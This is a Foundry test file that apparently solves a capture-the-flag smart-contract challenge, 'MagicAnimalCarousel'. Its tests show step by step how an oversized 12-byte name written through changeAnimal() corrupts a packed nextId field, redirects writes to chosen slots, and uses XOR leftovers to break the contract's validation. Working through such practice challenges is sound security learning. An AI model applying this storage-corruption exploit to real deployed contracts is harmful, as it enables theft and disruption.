// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {MagicAnimalCarousel} from "../../src/challenge-33-magic-animal-carousel/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel carousel;

    address user = 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0;

    function setUp() public {
        carousel = new MagicAnimalCarousel();
    }

    function testPrintAnimalEncodings() public view {
        _printEncoding("abcdefghij"); // 10 bytes
        _printEncoding("abcdefghijk"); // 11 bytes
        _printEncoding("abcdefghijkl"); // 12 bytes
    }

    function _printEncoding(string memory animal) internal view {
        uint256 encoded = carousel.encodeAnimalName(animal);
        uint256 encodedShifted = encoded >> 16;

        console.log("====================================");
        console.log("animal:", animal);
        console.log("");

        console.log("length:", bytes(animal).length);
        console.log("");

        console.log("encodeAnimalName(animal) as bytes32:");
        console.logBytes32(bytes32(encoded));
        console.log("");

        console.log("encodeAnimalName(animal) >> 16 as bytes32:");
        console.logBytes32(bytes32(encodedShifted));
        console.log("");
    }

    function testCompareSetAndChangeAnimal() public {
        vm.startPrank(user);

        carousel.setAnimalAndSpin("abcdefghij");

        uint256 crateBefore = carousel.carousel(1);

        console.log("====================================");
        console.log("After setAnimalAndSpin(\"abcdefghij\")");
        console.log("raw crate:");
        console.logBytes32(bytes32(crateBefore));
        console.log("");

        _decodeAndPrint(crateBefore);

        carousel.changeAnimal("abcdefghijkl", 1);

        uint256 crateAfter = carousel.carousel(1);

        console.log("====================================");
        console.log("After changeAnimal(\"abcdefghijkl\", 1)");
        console.log("raw crate:");
        console.logBytes32(bytes32(crateAfter));
        console.log("");

        _decodeAndPrint(crateAfter);

        vm.stopPrank();
    }

    function _decodeAndPrint(uint256 crate) internal pure {
        uint256 animalField = (crate >> 176) & type(uint80).max;
        uint256 nextId = (crate >> 160) & type(uint16).max;
        address owner = address(uint160(crate));

        console.log("decoded animal field (top 80 bits):");
        console.logBytes32(bytes32(animalField));
        console.log("");

        console.log("decoded nextId:");
        console.log(nextId);
        console.log("");

        console.log("decoded owner:");
        console.log(owner);
        console.log("");
    }

    function testExploitMagicAnimalCarousel() public {
        vm.startPrank(user);

        // ------------------------------------------------------------
        // Step 1: add a normal 10-byte animal
        // This writes into crate 1:
        // animal = "abcdefghij"
        // nextId = 2
        // owner = user
        // ------------------------------------------------------------
        carousel.setAnimalAndSpin("abcdefghij");

        uint256 crate1Before = carousel.carousel(1);

        assertEq(crate1Before, uint256(0x6162636465666768696a0002ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));
        assertEq(carousel.currentCrateId(), 1);

        // ------------------------------------------------------------
        // Step 2: corrupt crate 1 using a 12-byte animal
        // changeAnimal() writes the full 12-byte encoded name starting
        // at bit 160, so the last 2 bytes overlap with the nextId field.
        //
        // Old nextId = 0x0002
        // Overlapping bytes from "abcdefghijkl" = 0x6b6c ("kl")
        // OR result = 0x6b6e = 27502
        //
        // The visible 10-byte animal field remains "abcdefghij",
        // but nextId is corrupted.
        // ------------------------------------------------------------
        carousel.changeAnimal("abcdefghijkl", 1);

        uint256 crate1After = carousel.carousel(1);

        assertEq(crate1After, uint256(0x6162636465666768696a6b6eecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));

        // currentCrateId is still 1 here because changeAnimal()
        // does not modify it.
        assertEq(carousel.currentCrateId(), 1);

        // ------------------------------------------------------------
        // Step 3: spin again
        // setAnimalAndSpin() reads nextId from the current crate (crate 1).
        // Because crate 1 was corrupted, the next write goes to crate 27502
        // instead of crate 2.
        // ------------------------------------------------------------
        carousel.setAnimalAndSpin("mnopqrstuv");

        // The carousel now jumps to the corrupted crate id.
        assertEq(carousel.currentCrateId(), 27502);

        // Crate 2 remains untouched.
        assertEq(carousel.carousel(2), 0);

        // Crate 27502 now contains:
        // animal = "mnopqrstuv"
        // nextId = 27503
        // owner = user
        uint256 crate27502 = carousel.carousel(27502);

        assertEq(crate27502, uint256(0x6d6e6f707172737475766b6fecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));

        vm.stopPrank();
    }

    function testSolveMagicAnimalCarousel() public {
        vm.startPrank(user);

        // ------------------------------------------------------------
        // Step 1: add a normal animal
        // This writes into crate 1 and makes currentCrateId = 1.
        // ------------------------------------------------------------
        carousel.setAnimalAndSpin("abcdefghij");

        assertEq(carousel.currentCrateId(), 1);

        // ------------------------------------------------------------
        // Step 2: corrupt crate 1 with a 12-byte animal made of 0xff bytes.
        //
        // changeAnimal() writes 12 bytes starting at bit 160.
        // The last 2 bytes overlap with nextId.
        //
        // This sets crate 1 nextId to 0xffff = 65535.
        // ------------------------------------------------------------
        string memory corruptedAnimal = string(abi.encodePacked(bytes12(type(uint96).max)));

        carousel.changeAnimal(corruptedAnimal, 1);

        uint256 crate1AfterCorruption = carousel.carousel(1);

        assertEq(crate1AfterCorruption, uint256(0xffffffffffffffffffffffffecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));

        assertEq(carousel.currentCrateId(), 1);

        // ------------------------------------------------------------
        // Step 3: spin again.
        //
        // setAnimalAndSpin() reads nextId from crate 1.
        // Since we corrupted it to 65535, the next write goes to crate 65535.
        //
        // The new nextId stored inside crate 65535 becomes:
        // (65535 + 1) % 65535 = 1
        //
        // So crate 65535 now points back to crate 1.
        // ------------------------------------------------------------
        carousel.setAnimalAndSpin("mnopqrstuv");

        assertEq(carousel.currentCrateId(), 65535);

        uint256 crate65535 = carousel.carousel(65535);

        assertEq(crate65535, uint256(0x6d6e6f707172737475760001ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));

        vm.stopPrank();

        // ------------------------------------------------------------
        // Step 4: simulate the factory validation.
        //
        // The factory calls setAnimalAndSpin("Goat").
        // Since currentCrateId is 65535, the function reads nextId = 1
        // and writes "Goat" into crate 1.
        //
        // But crate 1 already contains dirty animal bits.
        // Because setAnimalAndSpin() uses XOR instead of replacing the animal,
        // the stored animal becomes different from "Goat".
        // ------------------------------------------------------------
        string memory goat = "Goat";

        carousel.setAnimalAndSpin(goat);

        uint256 currentCrateId = carousel.currentCrateId();
        uint256 animalInBox = carousel.carousel(currentCrateId) >> 176;
        uint256 goatEnc = uint256(bytes32(abi.encodePacked(goat))) >> 176;

        assertEq(currentCrateId, 1);
        assertTrue(animalInBox != goatEnc);
    }
}
